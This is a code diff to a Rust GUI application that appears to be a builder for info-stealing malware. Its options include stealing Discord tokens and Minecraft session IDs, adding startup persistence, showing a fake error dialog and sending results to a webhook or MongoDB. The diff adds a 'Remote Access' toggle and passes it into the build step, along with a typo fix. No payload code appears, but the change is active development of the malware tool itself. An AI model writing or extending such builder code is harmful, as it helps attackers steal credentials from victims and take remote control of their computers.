@@ -18,6 +18,7 @@ struct App {
     discord_token: bool,
     minecraft_ssid: bool,
     hook_to_startup: bool,
+    remote_access: bool,
 
     mongodb: bool,
     mongodb_uri: String,
@@ -40,6 +41,7 @@ enum Message {
     ToggleDiscordToken(bool),
     ToggleMinecraftSsid(bool),
     ToggleHookToStartup(bool),
+    ToggleRemoteAccess(bool),
     ToggleMongoDB(bool),
     ChangeMongoDBUri(String),
 
@@ -96,6 +98,9 @@ impl App {
             Message::ToggleFakeError(toggle) => {
                 self.fake_error = toggle;
             }
+            Message::ToggleRemoteAccess(toggle) => {
+                self.remote_access = toggle;
+            }
             Message::ChangeFakeErrorTitle(title) => {
                 self.fe_title = title;
             }
@@ -110,6 +115,7 @@ impl App {
                     self.discord_token,
                     self.fake_error,
                     self.hook_to_startup,
+                    self.remote_access,
                     self.fe_title.as_mut_str(),
                     self.fe_msg.as_mut_str(),
                     self.webhook_uri.clone(),
@@ -132,7 +138,7 @@ impl App {
             ]
             .into()
         } else {
-            text("Fake Error not enalbed").size(12.0).into()
+            text("Fake Error not enabled").size(12.0).into()
         };
 
         let row = row![
@@ -192,6 +198,13 @@ impl App {
                     .text_size(12.0)
                     .on_toggle(Message::ToggleFakeError),
                 fe
+            ]
+            .spacing(10.0),
+            column![
+                checkbox(self.remote_access)
+                    .label("Remote Access")
+                    .text_size(12.0)
+                    .on_toggle(Message::ToggleRemoteAccess),
             ]
             .spacing(10.0),
             column![
